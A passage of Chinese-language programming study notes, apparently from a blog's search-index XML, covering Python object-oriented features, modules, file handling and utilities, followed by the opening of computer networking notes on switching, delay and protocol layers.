class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 调用父类的构造函数</span>        self<span class="token punctuation">.</span>score<span class="token operator">=</span>score<span class="token comment" spellcheck="true"># 测试</span>stu<span class="token operator">=</span>Student<span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token string">'100'</span><span class="token punctuation">)</span>stu<span class="token punctuation">.</span>info</code></pre></li><li><p>方法重写</p><ul><li>如果子类对继承自父类的某个属性或方法不满意，可以在子类中对其进行重新编写</li><li>子类重写的方法中可以通过<code>super().xxx()</code>调用父类中被重写的方法</li></ul></li></ul></li><li><p><strong>多态</strong>：提高程序的可扩展性和可维护性。动态语言多崇尚“鸭子类型”，当一只鸟走起来像鸭子、游泳起来像鸭子，那么这只鸟就可以被称为鸭子，不关心对象的类型只关心对象的行为。</p><ul><li><p>简单的说，多态就是“具有多种形态”，它指的是：即便不知道一个变量所引用的对象到底是什么类型，仍然可以同个这个变量调用方法，在运行过程中根据变量所引用对象的类型，动态决定调用哪个对象中的方法</p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Animal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'动物要吃肉'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span>Animal<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'狗吃肉'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span>Animal<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'猫吃鱼'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'人吃五谷杂粮'</span><span class="token punctuation">)</span></code></pre></li><li><p><img src="/2022/03/10/pyNote/image-20210713091327080.png"></p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fun</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">:</span>    obj<span class="token punctuation">.</span>eat<span class="token punctuation">(</span><span class="token punctuation">)</span>   fun<span class="token punctuation">(</span>Dog<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>fun<span class="token punctuation">(</span>Cat<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>fun<span class="token punctuation">(</span>Person<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li><p>三种调用方法均不报错，判断条件只是<strong>调用的对象是否有eat()方法</strong></p></li></ul></li></ul></li><li><p><code>object</code>类</p><ul><li><p><code>print(stu)</code>调用的是<code>object</code>父类中的<code>__str__()</code>方法，可以对其进行重写来改变<code>print(stu)</code>的输出</p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'我的名字是{0},今年{1}岁'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">,</span>age<span class="token punctuation">)</span></code></pre></li></ul></li><li><p>特殊的属性</p><ul><li><img src="/2022/03/10/pyNote/image-20210713152605346.png"></li><li><code>x.__class__</code>输出对象的所属的类</li><li><code>C.__bases__</code>输出C的父类</li><li><code>C.__base__</code>输出第一个父类</li><li><code>C.__mro__</code>输出类的层次结构</li><li><code>A.__subclasses__</code>输出所有子类</li></ul></li><li><p>特殊的方法</p><ul><li>类当中的<code>__add__()</code>方法相当于<code>+</code></li><li>类当中的<code>__len__()</code>方法相当于<code>len()</code></li></ul></li><li><p><code>__init__()</code>和<code>__new__()</code></p><ul><li><code>__init__()</code>方法用于初始化</li><li><code>__new__()</code>方法用于创建对象</li><li><img src="/2022/03/10/pyNote/image-20210713155538726.png"></li></ul></li><li><p>类的赋值和浅拷贝</p><ul><li><p>类的赋值操作，使得两个对象<code>id</code>相同</p></li><li><p><code>python</code>拷贝一般都是<strong>浅拷贝</strong>，拷贝时对象包含的子对象内容不拷贝，因此源对象与拷贝对象会引用同一个子对象</p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">CPU</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">Disk</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">Computer</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>cpu<span class="token punctuation">,</span>disk<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>cpu<span class="token operator">=</span>cpu        self<span class="token punctuation">.</span>disk<span class="token operator">=</span>diskcpu1<span class="token operator">=</span>CPU<span class="token punctuation">(</span><span class="token punctuation">)</span>disk<span class="token operator">=</span>Disk<span class="token punctuation">(</span><span class="token punctuation">)</span>computer<span class="token operator">=</span>Computer<span class="token punctuation">(</span>cpu1<span class="token punctuation">,</span>disk<span class="token punctuation">)</span><span class="token keyword">import</span> copycomputer2<span class="token operator">=</span>copy<span class="token punctuation">.</span>copy<span class="token punctuation">(</span>computer<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>computer<span class="token punctuation">,</span>computer<span class="token punctuation">.</span>cpu<span class="token punctuation">,</span>computer<span class="token punctuation">.</span>disk<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>computer2<span class="token punctuation">,</span>computer2<span class="token punctuation">.</span>cpu<span class="token punctuation">,</span>computer2<span class="token punctuation">.</span>disk<span class="token punctuation">)</span></code></pre></li><li><p>其中<code>computer</code>和<code>computer2</code>指向的子对象都是<code>cpu1</code>和<code>disk</code></p></li></ul></li><li><p>深拷贝</p><ul><li>使用<code>copy</code>模块的<code>deepcopy</code>函数，递归拷贝对象中包含的子对象，源对象和拷贝对象对所有的子对象也不相同</li></ul></li><li><p>总结</p><p><img src="/2022/03/10/pyNote/image-20210714163638092.png"></p></li></ul><h3 id="11-模块"><a href="#11-模块" class="headerlink" title="11.模块"></a>11.模块</h3><ul><li><p>一个<code>.py</code>文件就是一个模块</p></li><li><p>将一个<code>python</code>程序分成几个模块开发</p></li><li><p>使用模块的好处</p><ul><li>方便其他程序和脚本的导入并使用</li><li>避免函数名和变量名的冲突</li><li>提高代码的可维护性</li><li>提高代码的可重用性</li></ul></li><li><p>自定义模块</p><ul><li>创建模块<ul><li>新建一个<code>.py</code>文件，名称尽量不要与<code>python</code>自带的标准模块名称相同</li></ul></li><li>导入模块<ul><li><code>import 模块名称 [as 别名]</code></li><li><code>from 模块名称 import 包/模块/函数/变量/类</code></li></ul></li></ul></li><li><p>以主程序(以主函数)形式运行</p><ul><li><p>导入自定义包的时候，会执行导入包的程序内容</p></li><li><p>使用</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre><p>后，当此包被导入后不会执行程序(即pass的内容)。</p></li></ul></li><li><p><code>python</code>中的包</p><ul><li>包是一个分层次的目录结构，它将一组功能相近的模块组织在一个目录下</li><li>作用<ul><li>代码规范</li><li>避免<strong>模块名称</strong>冲突</li></ul></li><li>包与目录的区别<ul><li>包含<code>__init__.py</code>文件的目录称为包</li><li>目录里通常不包含<code>__init__.py</code>文件</li></ul></li><li>包的导入<ul><li><code>import 包名.模块名</code></li></ul></li></ul></li><li><p><code>python</code>中常用的内置模块</p><ul><li><img src="/2022/03/10/pyNote/image-20210714173226452.png"></li></ul></li><li><p><strong>第三方模块</strong>的安装与使用</p><ul><li><code>cmd</code>界面<code>pip install 模块名</code></li><li><code>impot 模块名</code></li></ul></li></ul><h3 id="12-文件操作"><a href="#12-文件操作" class="headerlink" title="12.文件操作"></a>12.文件操作</h3><ul><li><p>编码格式</p><ul><li>常见的字符编码格式<ul><li><code>python</code>的解释器使用的事<code>Unicode</code>(内存)</li><li><code>.py</code>文件在磁盘上使用<code>UTF-8</code>存储(外存)</li><li><img src="/2022/03/10/pyNote/image-20210714204410409.png"></li></ul></li></ul></li><li><p>文件的读写原理</p><ul><li><p>文件的读写俗称“IO操作”</p></li><li><p>文件操作流程</p><ul><li><img src="/2022/03/10/pyNote/image-20210714205013731.png"></li></ul></li><li><p>内置函数<code>open()</code>创建文件对象</p><ul><li><p><img src="/2022/03/10/pyNote/image-20210714205412883.png"></p></li><li><p>语法规则</p><pre class=" language-python"><code class="language-python">file<span class="token operator">=</span>open<span class="token punctuation">(</span>filename<span class="token punctuation">[</span><span class="token punctuation">,</span>mode<span class="token punctuation">,</span>encoding<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre></li><li><p><code>mode</code>打开模式默认为只读，默认文本文件的编码格式为<code>gbk</code></p></li></ul></li></ul></li><li><p>常见的<strong>文件打开模式</strong></p><ul><li><p>按文件中数据的组织形式，文件分为以下两大类</p><ul><li><p>文本文件：存储的事普通“字符”文本，默认为<code>unicode</code>字符集，可以用记事本程序打开</p></li><li><p>二进制文件：把数据内容用“字节”进行存储，无法用记事本打开，必须使用专用的软件打开，举例：<code>mp3</code>音频文件，<code>jpg</code>图片,<code>doc</code>文档等</p></li><li><p><img src="/2022/03/10/pyNote/image-20210714210717541.png"></p></li><li><pre class=" language-python"><code class="language-python">src_file<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'logo.png'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>dest_file<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'logo_2.png'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span>dest_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>src_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>src_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>dest_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ul></li></ul></li><li><p>文件对象的<strong>常用方法</strong></p><ul><li><p><img src="/2022/03/10/pyNote/image-20210714211439794.png"></p></li><li><pre class=" language-python"><code class="language-python">file<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"123.txt"</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>file<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>tell<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>file<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li></ul></li><li><p><code>with</code>语句(上下文管理器)</p><ul><li><p><code>with</code>语句可以自动管理上下文资源，不论什么原因跳出<code>with</code>块，都能确保文件正确的关闭，以此来达到释放资源的目的</p></li><li><p><img src="/2022/03/10/pyNote/image-20210714213124509.png"></p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'123.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'logo.png'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> src_file<span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'logo_2.png'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> dest_file<span class="token punctuation">:</span>        dest_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>src_file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li></ul></li><li><p>目录操作</p><ul><li><p><code>os</code>模块是<code>python</code>内置的与操作系统功能和文件系统相关的模块，该模块中的语句的执行结果通常与操作系统有关，在不同的操作系统上运行，得到的结果可能不一样</p></li><li><p><code>os</code>模块与<code>os.path</code>模块用于对于目录或文件进行操作</p></li><li><p><code>os</code>模块</p><ul><li><code>os.startfile(str)</code>打开<code>exe</code>文件</li><li><code>os.system(cmd)</code>在<code>cmd</code>窗口输入命令</li><li><img src="/2022/03/10/pyNote/image-20210715092830825.png"></li></ul></li><li><p><code>os.path</code>模块</p><ul><li><img src="/2022/03/10/pyNote/image-20210715093427139.png"></li><li>判断后缀时可以使用<code>filename.endwith(.py)</code>函数，返回值是<code>bool</code>型</li></ul></li><li><p><code>os</code>模块中的<code>walk()</code>方法</p><ul><li><p><code>os.walk</code>方法用于通过在目录树中游走输出在目录中的文件名，向上或者向下</p></li><li><p>返回多个三元组<code>(root,dirs,files)</code></p><ul><li><p><code>root</code>指的是当前正在遍历的这个文件夹的本身的地址</p></li><li><p><code>dirs</code>是一个<code>list</code>，内容是该文件夹中所有的目录的名字(不包括子目录)</p></li><li><p><code>files</code>同样是一个<code>list</code>，内容是该文件夹中所有的文件(不包括子目录)</p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> ospath<span class="token operator">=</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>lst_files<span class="token operator">=</span>os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">for</span> dirpath<span class="token punctuation">,</span>dirname<span class="token punctuation">,</span>filename <span class="token keyword">in</span> lst_files<span class="token punctuation">:</span>    <span class="token keyword">for</span> dir <span class="token keyword">in</span> dirname<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>dirpath<span class="token punctuation">,</span>dir<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> file <span class="token keyword">in</span> filename<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>jion<span class="token punctuation">(</span>dirpath<span class="token punctuation">,</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li></ul></li></ul></li></ul></li></ul><h3 id="13-补充"><a href="#13-补充" class="headerlink" title="13.补充"></a>13.补充</h3><ol><li><code>eval</code>函数</li></ol><ul><li><p><code>eval</code>函数用来执行一个字符串表达式，并返回表达式的值。还可以把字符串转化为<code>list</code>,<code>tuple</code>,<code>dict</code>。</p></li><li><p><code>eval</code>函数的语法：</p><ul><li><code>eval(expression[,globals[,locals]])</code></li><li><code>expression</code>是表达式</li><li><code>globals</code>是变量的作用域，如果被提供，必须是一个字典对象</li><li><code>locals</code>是变量作用域，如果被提供，可以是任何映射对象</li></ul></li><li><p>实例：</p><ul><li><pre class=" language-python"><code class="language-python">a<span class="token operator">=</span><span class="token string">'[1,2,3,4,5,6]'</span>b<span class="token operator">=</span>eval<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#a是字符串类型数据，b是列表类型数据</span></code></pre></li><li><pre class=" language-python"><code class="language-python">a<span class="token operator">=</span><span class="token string">'{'</span>name<span class="token string">':zhangsan,'</span>age<span class="token string">':25}'</span>b<span class="token operator">=</span>eval<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#a是字符串类型数据，b是字典类型数据</span></code></pre></li><li><pre class=" language-python"><code class="language-python">a<span class="token operator">=</span><span class="token string">'(1,2,3,4,5,6)'</span>b<span class="token operator">=</span>eval<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#a是字符串类型数据，b是元组类型数据</span></code></pre></li><li><p>注意<code>eval</code>函数会忽略一些字符，比如说<code>\n</code></p></li></ul></li></ul><ol start="2"><li><code>print</code>语句中添加<code>f</code></li></ol><ul><li><pre class=" language-python"><code class="language-python">tensor<span class="token operator">=</span>torch<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Shape of tensor:{tensor.shape}"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 这条语句等效于</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Shape of tensor:{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>tensor<span class="token punctuation">.</span>shape<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li></ul><ol start="3"><li><p><code>lambda</code>函数用法</p><ul><li><p><code>lambda</code>函数是一类无需定义标识符(函数名)的函数或子程序</p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">sum</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> x<span class="token operator">+</span>y<span class="token comment" spellcheck="true">#上述代码相当于</span>sum <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y <span class="token punctuation">:</span>x<span class="token operator">+</span>y</code></pre></li></ul></li><li><p>项目打包为<code>exe</code>可执行文件</p><ul><li><p>安装第三方模块</p><ul><li><p>在线安装</p><p><code>pip intsall PyInstaller</code></p></li><li><p>执行打包操作</p><p><code>pyinstaller -F D:\PyCharm\py\studentInfoSystem\main.py</code></p><p><code>-F</code>是指只生成一个可执行文件</p><p>执行完毕后，<code>exe</code>文件存放在倒数第二行的路径之中</p></li></ul></li></ul></li><li><p>设置输出<strong>字体颜色</strong></p><ul><li><p><img src="/2022/03/10/pyNote/image-20210719172505689.png"></p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[0;35m\t\t图书音像勋章\033[m'</span><span class="token punctuation">)</span></code></pre></li><li><p>夹在<code>\033[0;35m</code>和<code>\033[m</code>之间的变色</p></li></ul></li><li><p><code>enumerate</code>函数</p><ul><li><p>用来获得列表数据及其<strong>索引</strong></p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> index<span class="token punctuation">,</span>value <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre></li><li><p>使用<code>enumerate</code>函数的原因是，用于修改列表中的值；如果不用<code>index</code>，那么修改的<code>value</code>仅是列表中值的拷贝</p></li></ul></li><li><p><code>excel</code>工具</p><ul><li>导入包<code>openpyxl</code></li><li><code>wk = openpyxl.Workbook()</code>创建工作簿对象</li><li><code>sheet = wk.sheet</code>获取活动表</li><li><code>sheet.append(item)</code>遍历列表，将列表中的数据添加到工作表中，表中的一条数据，在<code>excel</code>中是一行</li><li><code>wk.save()</code>保存</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网Note</title>
      <link href="/2022/03/09/%E8%AE%A1%E7%BD%91Note/"/>
      <url>/2022/03/09/%E8%AE%A1%E7%BD%91Note/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-计算机网络和因特网"><a href="#第一章-计算机网络和因特网" class="headerlink" title="第一章 计算机网络和因特网"></a>第一章 计算机网络和因特网</h1><h2 id="什么是因特网"><a href="#什么是因特网" class="headerlink" title="什么是因特网"></a>什么是因特网</h2><ul><li>计算机设备<ul><li>主机 = 端系统</li><li>运行网络应用程序</li></ul></li><li>连接设备的通信链路<ul><li>光纤，铜缆，无线电，人造卫星</li><li>传输速率 = 带宽</li></ul></li><li>转发数据的分组交换机<ul><li>链路层交换机</li><li>路由器</li></ul></li><li>因特网服务提供商（<code>ISP</code>）</li><li>协议<ul><li>定义了在两个或两个以上通信实体之间交换的报文格式和次序，以及报文发送和接收一条报文或其他事件所采取的动作</li></ul></li></ul><h2 id="网络边缘：主机；接入网；物理介质网络"><a href="#网络边缘：主机；接入网；物理介质网络" class="headerlink" title="网络边缘：主机；接入网；物理介质网络"></a>网络边缘：主机；接入网；物理介质网络</h2><ul><li>网络边缘<ul><li>主机：客户端和服务器</li><li>数据中心的服务器</li></ul></li><li>网络边缘的构成<ul><li>端系统（主机）<ul><li>运行应用程序，如：运行浏览器、微信等的网络应用程序的设备</li></ul></li></ul></li><li>网络应用的通信模型<ul><li>客户/服务器模型（<code>C/S</code>）</li><li>对等模型（<code>P2P</code>）</li></ul></li><li>接入网<ul><li>将网络边缘与网络核心连接起来，通常是将端系统连接到边缘路由器上</li><li>边缘路由器：端系统到任何其他远程端系统的路径上的第一台路由器</li></ul></li><li>接入的方式<ul><li>家庭：<code>Modem</code>拨号，<code>ADSL</code>拨号，<code>HFC</code>，<code>FTTH</code>，卫星</li><li>企业：以太网，<code>WIFI</code></li><li>广域无线接入：<code>3G</code>，<code>LTE</code>，<code>5G</code></li><li>局域网接入<ul><li>公司/大学的局域网（LAN）将端系统连接到边缘路由器</li><li>以太网</li></ul></li><li>无线接入<ul><li>共享的无线接入网络连接端系统和路由器</li><li>无线局域网</li><li>广域无线接入</li></ul></li></ul></li><li>物理媒体分类<ul><li>导引型媒体：信号沿着固体媒体被导引</li><li>非导引型媒体：信号自由传播</li><li>导引型媒体<ul><li>双绞线</li><li>同轴电缆</li><li>光缆</li></ul></li></ul></li></ul><h2 id="网络核心：分组-x2F-电路交换；网络结构"><a href="#网络核心：分组-x2F-电路交换；网络结构" class="headerlink" title="网络核心：分组/电路交换；网络结构"></a>网络核心：分组/电路交换；网络结构</h2><ul><li><p>电路交换网络</p><ul><li>数据交换过程<ul><li>第一步：建立连接；第二步：交换数据；第三步：释放链接</li></ul></li><li>电路交换的特性<ul><li>电路交换网络中（数字通信）</li><li>数据交换前需建立起一条从发端到收端的电路（预留资源）</li><li>在数据交换的全部时间内用户始终占用端到端的固定传输信道</li><li>交换双方可实时进行数据交换而不会存在任何延迟</li><li>电路交换的用户始终占用端到端的通信资源<ul><li>独占链路，链路利用率太低</li></ul></li></ul></li><li>电路交换中的复用<ul><li>时分复用<ul><li>时间被划分为固定期间的帧，并且每个帧又被划分为固定数量的时隙</li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228212931943.png" alt="image-20211228212931943"></li></ul></li><li>频分复用<ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228213021455.png" alt="image-20211228213021455"></li></ul></li></ul></li></ul></li><li><p>分组交换</p><ul><li><p>数据被截断划分为分组</p></li><li><p>分组交换机（路由器）转发分组</p></li><li><p>使用链路最大传输速率</p></li><li><p>为什么要分组</p><ul><li>提高传输效率</li><li>提高传输质量</li><li>链路利用率高</li></ul></li><li><p><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228213245233.png" alt="image-20211228213245233"></p></li><li><p>怎么分组</p><ul><li>在发送端，先把较长的报文划分成较短的、固定长度的数据段</li><li>每个数据段前面添加上首部构成分组</li><li>分组交换网以“分组”作为数据传输单元</li><li>依次把各分组发送到接收端</li><li>接收端收到分组后剥去首部还原成报文</li></ul></li><li><p>分组传输的模式</p><ul><li><p>存储转发传输</p><p>分组交换机（链路层交换机或路由器）将整个分组收下并存储存储后再发出去</p></li><li><p>原因：校验</p></li></ul></li><li><p>分组交换的特征</p><ul><li>数据分成若干组分别传送</li><li>不必预先确定分组的传输路径</li><li>交换节点均为共享节点，选择路径</li><li>存储/转发</li><li>断续（动态）分配传输带宽</li></ul></li><li><p>存储转发的效率和可靠性</p><ul><li>传输时延（发送时延）<ul><li>将分组推向链路的时间，L/R，其中R为链路带宽</li></ul></li><li>排队时延<ul><li>存储需要缓存，缓存的过程中可能需要排队（等待前面的分组处理）</li></ul></li><li>分组丢失<ul><li>缓存满，随即丢弃等方式</li></ul></li></ul></li><li><p>分组转发的路径（寻路）</p><ul><li>分组首部包含目的地址</li><li>路由表里面有转发表</li></ul></li></ul></li><li><p>分组交换 VS 电路交换</p><ul><li>分组交换网络存在的问题<ul><li>分组在各节点村存储转发时因为需要排队总会造成一定的时延，当网络通信量过大时，这种时延可能会很大</li><li>各分组必须携带一定的控制信息（说明信息），从而带来额外的开销</li><li>整个分组交换网的管理和控制比较复杂</li></ul></li><li>若要连续传送大量数据，且其传送时间远大于呼叫建立时间，则采用在数据通信之前预先分配传输带宽的电路交换较为合适</li><li>分组交换不需要预先分配带宽，在传送突发数据时可提高整个网络的信道利用率</li></ul></li></ul><h2 id="分组交换网的时延、丢包和吞吐量"><a href="#分组交换网的时延、丢包和吞吐量" class="headerlink" title="分组交换网的时延、丢包和吞吐量"></a>分组交换网的时延、丢包和吞吐量</h2><ul><li>分组交换比电路交换不足之处<ul><li>网络延迟<ul><li>时延、丢包等</li></ul></li></ul></li><li>数据丢失和产生时延的原因<ul><li>在路由器缓存中的分组队列<ul><li>分组到达输入链路的速率超出输出链路的能力</li><li>分组队列，等待转发</li></ul></li><li>节点处理实验<code>dproc</code><ul><li>检测比特差错</li><li>确定输出链路</li></ul></li><li>排队时延<code>dqueue</code><ul><li>在输出链路中等待被发送</li><li>取决于路由器的拥塞程度</li></ul></li><li>传输时延<code>dtrans</code><ul><li>R=链路带宽，L=分组长度</li><li>将分组比特流发送到链路上的时间=L/R</li></ul></li><li>传播时延<code>dprop</code><ul><li>d=物理链路的长度，s=媒体中的传播速度</li><li>传播时延=d/s</li></ul></li><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228215605760.png" alt="image-20211228215605760"></li></ul></li><li>吞吐量<ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228215721466.png" alt="image-20211228215721466"></li></ul></li></ul><h2 id="协议层次"><a href="#协议层次" class="headerlink" title="协议层次"></a>协议层次</h2><ul><li><p>因特网的协议栈</p><ul><li>应用层，支持网络应用<ul><li><code>FTP</code>，<code>SMTP</code>，<code>HTTP</code></li></ul></li><li>运输层，主机间的数据传输<ul><li><code>TCP</code>，<code>UDP</code></li></ul></li><li>网络层，将数据报从源<strong>端</strong>传送到目的<strong>端</strong><ul><li><code>IP</code>，路由协议</li></ul></li><li>链路层，数据在网络相邻节点之间传输<ul><li><code>PPP</code>，以太网</li></ul></li><li>物理层，在线路上传输比特流</li></ul></li><li><p>封装</p><ul><li><img src="/2022/03/09/%E8%AE%A1%E7%BD%91Note/image-20211228220205436.png" alt="image-20211228220205436"></li></ul></li></ul><hr><h1 id="第二章-应用层（报文）"><a href="#第二章-应用层（报文）" class="headerlink" title="第二章 应用层（报文）"></a>第二章 应用层（报文）</h1><h2 id="应用层协议原理"><a href="#应用层协议原理" class="headerlink" title="应用层协议原理"></a>应用层协议原理</h2><ul><li>网络应用的架构<ul><li>客户端/服务器</li><li>对等网（<code>P2P</code>）</li></ul></li><li>套接字<ul><li>每个网络应用进程都有一个属于自己的套接字，该套接字在整个因特网上独一无二<ul><li>主机地址：标识该网络进程运行在因特网上哪一台主机上，通产使用32位<code>IP</code>地址标识</li><li>端口地址：在该主机上标识该网络应用进程通常使用16位端口号标识</li></ul></li><li>长度为16+32=48位</li></ul></li></ul><h2 id="Web和HTTP"><a href="#Web和HTTP" class="headerlink" 